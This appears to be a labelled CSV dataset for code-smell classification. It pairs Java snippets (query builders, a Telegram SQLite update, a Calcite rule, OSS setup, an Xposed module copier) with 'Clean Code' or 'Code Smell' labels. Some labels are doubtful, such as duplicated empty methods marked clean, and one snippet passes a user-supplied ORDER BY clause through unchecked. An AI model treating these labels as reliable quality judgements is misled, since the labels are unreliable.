text,label,text_label
"@Override public DataResult<Chart> queryExistent(ChartQueryParam param){
  EasyLambdaQueryWrapper<ChartDO> queryWrapper=new EasyLambdaQueryWrapper<>();
  queryWrapper.eq(ChartDO::getDeleted,YesOrNoEnum.NO.getLetter()).eqWhenPresent(ChartDO::getId,param.getId()).eqWhenPresent(ChartDO::getUserId,param.getUserId());
  IPage<ChartDO> page=getMapper().selectPage(new Page<>(1,1),queryWrapper);
  if (CollectionUtils.isEmpty(page.getRecords())) {
    throw new DataNotFoundException();
  }
  Chart data=chartConverter.do2model(page.getRecords().get(0));
  setDataSourceInfo(Lists.newArrayList(data));
  return DataResult.of(data);
}
@Override public DataResult<Chart> queryExistent(Long id){
  DataResult<Chart> dataResult=find(id);
  if (dataResult.getData() == null) {
    throw new DataNotFoundException();
  }
  return dataResult;
}",0,Clean Code
"@Override public CfLogisticsStorehousePlatformCargoTypeExample getExampleByQuery(CfLogisticsStorehousePlatformCargoTypeQuery cfLogisticsStorehousePlatformCargoTypeQuery){
  CfLogisticsStorehousePlatformCargoTypeExample cfLogisticsStorehousePlatformCargoTypeExample=new CfLogisticsStorehousePlatformCargoTypeExample();
  CfLogisticsStorehousePlatformCargoTypeExample.Criteria criteria=cfLogisticsStorehousePlatformCargoTypeExample.createCriteria();
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId() != null) {
    criteria.andLogisticsStorehouseIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehouseId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId() != null) {
    criteria.andLogisticsStorehousePlatformIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds().size() > 0) {
    criteria.andLogisticsStorehousePlatformIdIn(cfLogisticsStorehousePlatformCargoTypeQuery.getLogisticsStorehousePlatformIds());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId() != null) {
    criteria.andFactoryIdEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getFactoryId());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType() != null) {
    criteria.andCargoTypeEqualTo(cfLogisticsStorehousePlatformCargoTypeQuery.getCargoType());
  }
  if (StringUtils.isNotEmpty(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy())) {
    cfLogisticsStorehousePlatformCargoTypeExample.setOrderByClause(cfLogisticsStorehousePlatformCargoTypeQuery.getOrderBy());
  }
  if (cfLogisticsStorehousePlatformCargoTypeQuery.getPage() != null && cfLogisticsStorehousePlatformCargoTypeQuery.getSize() != null) {
    PageHelper.startPage(cfLogisticsStorehousePlatformCargoTypeQuery.getPage(),cfLogisticsStorehousePlatformCargoTypeQuery.getSize());
  }
  return cfLogisticsStorehousePlatformCargoTypeExample;
}",0,Clean Code
"@Override public void nodeClicked(final CombinedDiffNode node,final MouseEvent event,final double x,final double y){
  if (SwingUtilities.isRightMouseButton(event)) {
    if (node.getRawNode() instanceof RawCombinedFunction) {
      final JPopupMenu menu=new CallGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
 else     if (node.getRawNode() instanceof RawCombinedBasicBlock) {
      final JPopupMenu menu=new FlowGraphPopupMenu(controller,graph,node);
      menu.show(graph.getView(),event.getX(),event.getY());
    }
    return;
  }
  if (SwingUtilities.isLeftMouseButton(event) && event.getClickCount() == 2 && graph.getGraphType() == EGraphType.CALL_GRAPH) {
    controller.openFlowgraphsViews(node);
  }
}",0,Clean Code
"public void updateTopicData(long dialogId,TLRPC.TL_forumTopic fromTopic,int flags){
  if (fromTopic == null) {
    return;
  }
  storageQueue.postRunnable(() -> {
    SQLitePreparedStatement state=null;
    SQLiteCursor cursor=null;
    try {
      if ((flags & TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) != 0) {
        state=database.executeFast(""UPDATE topics SET total_messages_count = ? WHERE did = ? AND topic_id = ?"");
        state.requery();
        state.bindInteger(1,fromTopic.totalMessagesCount);
        state.bindLong(2,dialogId);
        state.bindInteger(3,fromTopic.id);
        state.step();
        state.dispose();
        if (flags == TopicsController.TOPIC_FLAG_TOTAL_MESSAGES_COUNT) {
          return;
        }
      }
      TLRPC.TL_forumTopic topicToUpdate=null;
      cursor=database.queryFinalized(String.format(Locale.US,""SELECT data FROM topics WHERE did = %d AND topic_id = %d"",dialogId,fromTopic.id));
      if (cursor.next()) {
        NativeByteBuffer data=cursor.byteBufferValue(0);
        if (data != null) {
          topicToUpdate=TLRPC.TL_forumTopic.TLdeserialize(data,data.readInt32(true),true);
          data.reuse();
        }
      }
      cursor.dispose();
      cursor=null;
      if (topicToUpdate != null) {
        if ((flags & TopicsController.TOPIC_FLAG_TITLE) != 0) {
          topicToUpdate.title=fromTopic.title;
        }
        if ((flags & TopicsController.TOPIC_FLAG_ICON) != 0) {
          topicToUpdate.icon_emoji_id=fromTopic.icon_emoji_id;
          topicToUpdate.flags|=1;
        }
        if ((flags & TopicsController.TOPIC_FLAG_PIN) != 0) {
          topicToUpdate.pinned=fromTopic.pinned;
          topicToUpdate.pinnedOrder=fromTopic.pinnedOrder;
        }
        int pinnedOrder=topicToUpdate.pinned ? 1 + topicToUpdate.pinnedOrder : 0;
        if ((flags & TopicsController.TOPIC_FLAG_CLOSE) != 0) {
          topicToUpdate.closed=fromTopic.closed;
        }
        if ((flags & TopicsController.TOPIC_FLAG_HIDE) != 0) {
          topicToUpdate.hidden=fromTopic.hidden;
        }
        state=database.executeFast(""UPDATE topics SET data = ?, pinned = ?, hidden = ? WHERE did = ? AND topic_id = ?"");
        database.beginTransaction();
        NativeByteBuffer data=new NativeByteBuffer(topicToUpdate.getObjectSize());
        topicToUpdate.serializeToStream(data);
        state.bindByteBuffer(1,data);
        state.bindInteger(2,pinnedOrder);
        state.bindInteger(3,topicToUpdate.hidden ? 1 : 0);
        state.bindLong(4,dialogId);
        state.bindInteger(5,topicToUpdate.id);
        state.step();
        data.reuse();
      }
    }
 catch (    Exception e) {
      checkSQLException(e);
    }
 finally {
      if (state != null) {
        state.dispose();
      }
      if (cursor != null) {
        cursor.dispose();
      }
      database.commitTransaction();
    }
  }
);
}",1,Code Smell
"/** 
 * Returns the most restrictive type that is assignable from all given types.
 */
static Type gcd(Type... types){
  if (types.length == 0) {
    return Object.class;
  }
  Type best=types[0];
  Primitive bestPrimitive=Primitive.of(best);
  if (bestPrimitive != null) {
    for (int i=1; i < types.length; i++) {
      final Primitive primitive=Primitive.of(types[i]);
      if (primitive == null) {
        return Object.class;
      }
      if (primitive.assignableFrom(bestPrimitive)) {
        bestPrimitive=primitive;
      }
 else       if (bestPrimitive.assignableFrom(primitive)) {
      }
 else       if (bestPrimitive == Primitive.CHAR || bestPrimitive == Primitive.BYTE) {
        bestPrimitive=Primitive.INT;
        --i;
      }
 else {
        return Object.class;
      }
    }
    return bestPrimitive.primitiveClass;
  }
 else {
    for (int i=1; i < types.length; i++) {
      if (types[i] != types[0]) {
        return Object.class;
      }
    }
  }
  return types[0];
}",1,Code Smell
"/** 
 * FS interface method start 
 */
@Override public void init(Map<String,String> properties) throws IOException {
  if (label == null && (boolean)org.apache.linkis.common.conf.Configuration.IS_MULTIPLE_YARN_CLUSTER()) {
    label=StorageConfiguration.LINKIS_STORAGE_FS_LABEL().getValue();
  }
  conf=HDFSUtils.getConfigurationByLabel(user,label);
  Map<String,String> originProperties=Maps.newHashMap();
  originProperties.put(""fs.oss.endpoint"",StorageConfiguration.OSS_ENDPOINT().getValue());
  originProperties.put(""fs.oss.accessKeyId"",StorageConfiguration.OSS_ACCESS_KEY_ID().getValue());
  originProperties.put(""fs.oss.accessKeySecret"",StorageConfiguration.OSS_ACCESS_KEY_SECRET().getValue());
  for (  String key : originProperties.keySet()) {
    String value=originProperties.get(key);
    if (StringUtils.isNotBlank(value)) {
      conf.set(key,value);
    }
  }
  if (MapUtils.isNotEmpty(properties)) {
    for (    String key : properties.keySet()) {
      String v=properties.get(key);
      if (StringUtils.isNotBlank(v)) {
        conf.set(key,v);
      }
    }
  }
  fs=new AliyunOSSFileSystem();
  try {
    fs.initialize(new URI(StorageUtils.OSS_SCHEMA() + StorageConfiguration.OSS_ACCESS_BUCKET_NAME().getValue()),conf);
  }
 catch (  URISyntaxException e) {
    throw new IOException(""init OSS FileSystem failed!"");
  }
  if (fs == null) {
    throw new IOException(""init OSS FileSystem failed!"");
  }
}
",1,Code Smell
"/** 
 * 投影值分组
 * @param result
 * @param minPixelNum 最小像素累计值
 * @param minSpace    最小间隔数
 * @return
 */
public static List<int[]> groupResult(int[] result,int minPixelNum,int minSpace){
  List<int[]> bwY=new ArrayList<>();
  if (result.length > 0) {
    int targetStart=-1;
    int cal=0;
    for (int i=0; i < result.length; i++) {
      if (targetStart == -1 && result[i] > minPixelNum) {
        targetStart=i;
      }
 else       if (targetStart != -1) {
        if (result[i] <= minPixelNum) {
          if (cal > minSpace) {
            bwY.add(new int[]{targetStart,i - cal});
            targetStart=-1;
            cal=0;
          }
 else {
            cal++;
          }
        }
 else {
          cal=0;
        }
      }
    }
    if (targetStart != -1 && cal <= minSpace) {
      bwY.add(new int[]{targetStart,result.length - 1});
    }
  }
  return bwY;
}",1,Code Smell
"/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
/** 
 * For rows that willing to participate entrance transition,  this function hide views if afterTransition is true,  show views if afterTransition is false.
 */
public void setEntranceTransitionState(boolean state){
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
@Override public void setEntranceTransitionState(boolean state){
  getFragment().setEntranceTransitionState(state);
}
",0,Clean Code
"private void copySoFile(){
  String[] existLibPathArray=new String[3];
  int arrayIndex=0;
  for (  String libPath : APK_LIB_PATH_ARRAY) {
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    if (apkSoFullPathFile.exists()) {
      existLibPathArray[arrayIndex]=libPath;
      arrayIndex++;
    }
  }
  if (arrayIndex == 0) {
    String libPath=APK_LIB_PATH_ARRAY[0];
    String apkSoFullPath=fullLibPath(libPath);
    File apkSoFullPathFile=new File(apkSoFullPath);
    apkSoFullPathFile.mkdirs();
    existLibPathArray[arrayIndex]=libPath;
  }
  for (  String libPath : existLibPathArray) {
    if (libPath != null && !libPath.isEmpty()) {
      String apkSoFullPath=fullLibPath(libPath);
      copyLibFile(apkSoFullPath,mSoFilePathMap.get(libPath));
    }
  }
  if (xposedModuleArray != null && xposedModuleArray.length > 0) {
    int index=0;
    for (    String modulePath : xposedModuleArray) {
      modulePath=modulePath.trim();
      if (modulePath == null || modulePath.length() == 0) {
        continue;
      }
      File moduleFile=new File(modulePath);
      if (!moduleFile.exists()) {
        continue;
      }
      for (      String libPath : existLibPathArray) {
        if (libPath != null && !libPath.isEmpty()) {
          String apkSoFullPath=fullLibPath(libPath);
          String outputModuleName=XPOSED_MODULE_FILE_NAME_PREFIX + index + SO_FILE_SUFFIX;
          File outputModuleSoFile=new File(apkSoFullPath,outputModuleName);
          FileUtils.copyFile(moduleFile,outputModuleSoFile);
        }
      }
      index++;
    }
  }
}",1,Code Smell
"public void onMatch(RelOptRuleCall call){
  final Project topProject=call.rel(0);
  final Project bottomProject=call.rel(1);
  final RelBuilder relBuilder=call.builder();
  final Permutation topPermutation=topProject.getPermutation();
  if (topPermutation != null) {
    if (topPermutation.isIdentity()) {
      return;
    }
    final Permutation bottomPermutation=bottomProject.getPermutation();
    if (bottomPermutation != null) {
      if (bottomPermutation.isIdentity()) {
        return;
      }
      final Permutation product=topPermutation.product(bottomPermutation);
      relBuilder.push(bottomProject.getInput());
      relBuilder.project(relBuilder.fields(product),topProject.getRowType().getFieldNames());
      call.transformTo(relBuilder.build());
      return;
    }
  }
  if (!force) {
    if (RexUtil.isIdentity(topProject.getProjects(),topProject.getInput().getRowType())) {
      return;
    }
  }
  final List<RexNode> newProjects=RelOptUtil.pushPastProject(topProject.getProjects(),bottomProject);
  final RelNode input=bottomProject.getInput();
  if (RexUtil.isIdentity(newProjects,input.getRowType())) {
    if (force || input.getRowType().getFieldNames().equals(topProject.getRowType().getFieldNames())) {
      call.transformTo(input);
      return;
    }
  }
  relBuilder.push(bottomProject.getInput());
  relBuilder.project(newProjects,topProject.getRowType().getFieldNames());
  call.transformTo(relBuilder.build());
}",1,Code Smell
